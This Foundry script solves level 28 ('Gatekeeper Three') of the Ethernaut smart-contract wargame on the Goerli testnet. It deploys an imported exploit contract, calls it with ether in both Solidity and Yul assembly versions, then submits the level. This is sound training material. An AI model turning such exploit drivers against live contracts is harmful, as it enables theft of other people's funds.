// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

import { Gatekeeper3Exploit } from "../../contracts/28_Gatekeeper3.sol";

interface Instance {
    function entrant() external view returns (address);
}

contract Gatekeeper3Script is EthernautScript {
    string network = "goerli";
    address level = 0x762db91C67F7394606C8A636B5A55dbA411347c6;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        Gatekeeper3Exploit exploit = new Gatekeeper3Exploit();
        exploit.exploit{ value: 0.0011 ether }(address(instance));
        require(instance.entrant() == player, "not player");
    }

    function yulVersion() internal {
        bytes memory initCode = type(Gatekeeper3Exploit).creationCode;
        assembly {
            let exploit := create(0, add(initCode, 0x20), mload(initCode))
            let _instance := sload(instance.slot)

            mstore(0, "exploit(address)")
            mstore(0, keccak256(0, 16))
            mstore(4, _instance)
            let _value := mul(11, exp(10, 14)) // 0.0011 ether == 11e14
            let success := call(gas(), exploit, _value, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            mstore(0, "entrant()")
            mstore(0, keccak256(0, 9))
            pop(staticcall(gas(), _instance, 0, 4, 0, 0x20))
            if iszero(eq(mload(0), sload(player.slot))) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
